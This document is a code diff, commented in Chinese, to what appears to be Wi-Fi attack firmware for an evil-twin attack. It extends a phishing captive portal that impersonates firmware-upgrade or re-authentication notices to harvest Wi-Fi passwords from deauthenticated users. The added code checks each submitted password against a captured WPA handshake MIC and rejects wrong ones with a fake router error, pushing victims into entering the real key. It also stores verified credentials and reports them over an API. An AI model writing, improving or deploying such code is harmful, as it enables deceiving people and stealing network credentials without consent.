@@ -320,21 +320,25 @@ struct CredentialEntry {
   char clientIp[20];
   char pass[64];
   uint32_t capturedAt;
+  bool verified;   // true = 已用抓到的 M1/M2 做过 MIC 校验且通过 (密码真实有效)
 };
 static CredentialEntry sCreds[16];
 static uint8_t sCredHead = 0;
 static uint8_t sCredCount = 0;
 static uint32_t sCredId = 0;
+static uint32_t sPortalRejects = 0;   // 门户提交但未通过 MIC 校验的次数 (不写入凭据表)
 
-static void addCredential(const String &clientIp, const String &pass) {
+static void addCredential(const String &clientIp, const String &pass, bool verified) {
   CredentialEntry &e = sCreds[sCredHead];
   e.id = ++sCredId;
   strlcpy(e.clientIp, clientIp.c_str(), sizeof(e.clientIp));
   strlcpy(e.pass, pass.c_str(), sizeof(e.pass));
   e.capturedAt = millis();
+  e.verified = verified;
   sCredHead = (sCredHead + 1) % 16;
   if (sCredCount < 16) sCredCount++;
   log("[eviltwin] 捕获到客户端提交的凭据: IP=" + clientIp + " 密码长度=" + String(pass.length()) +
+      (verified ? " (已通过握手 MIC 校验)" : " (未校验: 无可用握手)") +
       " (明文仅存于凭据表, 不写入日志/串口遥测)");
 }
 
@@ -2525,8 +2529,37 @@ static bool computeM2Mic(const char *pass, uint8_t mic[16]) {
   uint8_t frame[256];
   memcpy(frame, sHandshake.eapol, sHandshake.eapolLen);
   memset(frame + 81, 0, 16);      // MIC 字段置零后才是被 HMAC 的内容
-  mbedtls_md_hmac(md, ptk, 16, frame, sHandshake.eapolLen, mic);
+  // 注意: SHA1 摘要 20 字节 / MD5 16 字节。输出缓冲必须按最长摘要预留,
+  // 否则 SHA1 会越界写 4 字节踩坏调用方栈上的 canary (真机实测 Stack smashing)。
+  uint8_t digest[20];
+  mbedtls_md_hmac(md, ptk, 16, frame, sHandshake.eapolLen, digest);
+  memcpy(mic, digest, 16);        // MIC 只取前 16 字节
   return true;
+}
+
+/* ---------------- 门户密码验真 (基于已捕获的 M1/M2) ----------------
+ * 已抓到目标网络完整四次握手时, 门户提交的密码可以在板上直接判定真伪:
+ *   PMK = PBKDF2-HMAC-SHA1(密码, SSID, 4096, 32)
+ *   PTK = PRF-512(PMK, "Pairwise key expansion", AA|SPA|ANonce|SNonce)
+ *   MIC = HMAC(PTK[0..15], M2 帧且 MIC 字段置零)
+ * 与 M2 自带的 MIC 相等 = 密码正确; 否则判为假密码, 不入库并要求重新输入。
+ * 没有握手 / 握手属于别的 SSID / keyver 不支持时返回"无法校验", 保持原流程。 */
+enum : uint8_t { PORTAL_UNVERIFIED = 0, PORTAL_VERIFIED = 1, PORTAL_REJECTED = 2 };
+
+// 是否具备验真条件: 抓到了同一 SSID 的完整 M1+M2, 且 MIC 算法板载可实现
+static bool portalVerifiable() {
+  if (!sHandshake.m1 || !sHandshake.m2 || !sHandshake.captured) return false;
+  if (sHandshake.eapolLen < 97) return false;
+  if (sHandshake.keyver == 0 || sHandshake.keyver >= 3) return false;   // SAE / PMF 未实现
+  String want = sEvilTwin.cloneSsid.length() ? sEvilTwin.cloneSsid : sTarget.ssid;
+  return want.length() > 0 && sHandshake.essid == want;                 // PMK 的盐必须一致
+}
+
+static uint8_t verifyPortalPassword(const String &pass) {
+  if (!portalVerifiable()) return PORTAL_UNVERIFIED;
+  uint8_t mic[16];
+  if (!computeM2Mic(pass.c_str(), mic)) return PORTAL_UNVERIFIED;
+  return memcmp(mic, sHandshake.eapol + 81, 16) == 0 ? PORTAL_VERIFIED : PORTAL_REJECTED;
 }
 
 // 关闭监听并恢复 AP 信道 (停止/跑包前调用)
@@ -2730,7 +2763,8 @@ static void sendVendorDb() {
   server.send_P(200, "application/javascript; charset=utf-8", (const char *)VENDOR_DB, VENDOR_DB_LEN);
 }
 
-static void sendPortalPage() {
+// 门户页面 (err 非空时在表单上方显示错误提示: 密码未通过 MIC 校验时要求重输)
+static String portalHtml(const String &err) {
   String targetName = sEvilTwin.cloneSsid.length() ? sEvilTwin.cloneSsid : (sTarget.ssid.length() ? sTarget.ssid : apSsid);
 
   // 攻击准备 (页面模板): 1=固件升级 2=认证过期 3=网络拥堵重连
@@ -2756,6 +2790,7 @@ static void sendPortalPage() {
       break;
   }
 
+  String errBox = err.length() ? ("<div class='err'>" + htmlEscape(err) + "</div>") : String("");
   String html = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1'>"
     "<title>" + tplTitle + "</title>"
@@ -2771,11 +2806,13 @@ static void sendPortalPage() {
     "button{width:100%;padding:14px;background:#ffdf5d;color:#111;font-weight:900;font-size:16px;border:3px solid #111;border-radius:12px;cursor:pointer;box-shadow:4px 4px 0 #111}"
     "button:active{transform:translate(2px,2px);box-shadow:2px 2px 0 #111}"
     ".foot{text-align:center;font-size:11px;color:#888;margin-top:20px}"
+    ".err{background:#ffe3e3;border-left:5px solid #e05252;padding:10px;border-radius:6px;font-size:13px;margin-bottom:16px;color:#a11;font-weight:700}"
     "</style></head><body>"
     "<div class='card'>"
     "<div class='badge'>" + tplBadge + "</div>"
     "<h2>" + tplTitle + "</h2>"
     "<div class='warn-box'>" + tplWarn + "</div>"
+    + errBox +
     "<p>请输入该 Wi-Fi 网络当前使用的连接密码：</p>"
     "<form method='POST' action='/api/portal/submit'>"
     "<input type='password' name='wifi_password' placeholder='请输入 Wi-Fi 密码' required minlength='8' autocomplete='off'>"
@@ -2783,15 +2820,29 @@ static void sendPortalPage() {
     "</form>"
     "<div class='foot'>" + tplFoot + "</div>"
     "</div></body></html>";
-  server.send(200, "text/html; charset=utf-8", html);
+  return html;
+}
+
+static void sendPortalPage() {
+  server.send(200, "text/html; charset=utf-8", portalHtml(""));
 }
 
 static void handlePortalSubmit() {
   String pass = server.arg("wifi_password");
   pass.trim();
   String clientIp = server.client().remoteIP().toString();
+  // 有握手就验真: 假密码直接打回, 不写入凭据表, 逼迫输入真实口令
+  const uint8_t verdict = verifyPortalPassword(pass);
+  if (verdict == PORTAL_REJECTED) {
+    sPortalRejects++;
+    log("[eviltwin] 门户提交的密码未通过握手 MIC 校验, 已拒绝并要求重输 (累计 " +
+        String(sPortalRejects) + " 次, 明文不落库)");
+    server.send(200, "text/html; charset=utf-8",
+                portalHtml("密码校验失败：与路由器当前使用的加密密钥不匹配，请核对后重新输入。"));
+    return;
+  }
   if (pass.length() > 0) {
-    addCredential(clientIp, pass);
+    addCredential(clientIp, pass, verdict == PORTAL_VERIFIED);
     // 双子攻击中捕获到第一条凭据: 自动收尾 — 停止 Deauth/跳频, 同名开放热点保留供其浏览
     if (sEvilTwin.active && !sEvilTwin.caught) {
       sEvilTwin.caught = true;
@@ -2899,6 +2950,7 @@ static void sendInfo() {
           ",\"band\":" + String(isBand5G(sDeauth.targetChannel) ? 5 : 2) + "},";
   json += "\"handshake\":{\"capturing\":" + String(sHandshake.capturing ? "true" : "false") +
           ",\"captured\":" + String(sHandshake.captured ? "true" : "false") +
+          ",\"verifiable\":" + String(portalVerifiable() ? "true" : "false") +
           ",\"keyver\":" + String(sHandshake.keyver) +
           ",\"frames\":" + String(sHandshake.frameCount) +
           ",\"m4\":" + String(sHandshake.m4 ? "true" : "false") +
@@ -3211,9 +3263,10 @@ static void handleEvilTwinCreds() {
             ",\"clientIp\":\"" + jsonEscape(String(sCreds[idx].clientIp)) +
             "\",\"mac\":\"" + jsonEscape(String(sCreds[idx].clientIp)) +
             "\",\"pass\":\"" + jsonEscape(String(sCreds[idx].pass)) +
-            "\",\"time\":\"" + jsonEscape(timeStr) + "\"}";
+            "\",\"verified\":" + String(sCreds[idx].verified ? "true" : "false") +
+            ",\"time\":\"" + jsonEscape(timeStr) + "\"}";
   }
-  json += "]}";
+  json += "],\"rejects\":" + String(sPortalRejects) + "}";
   server.send(200, "application/json", json);
 }
 
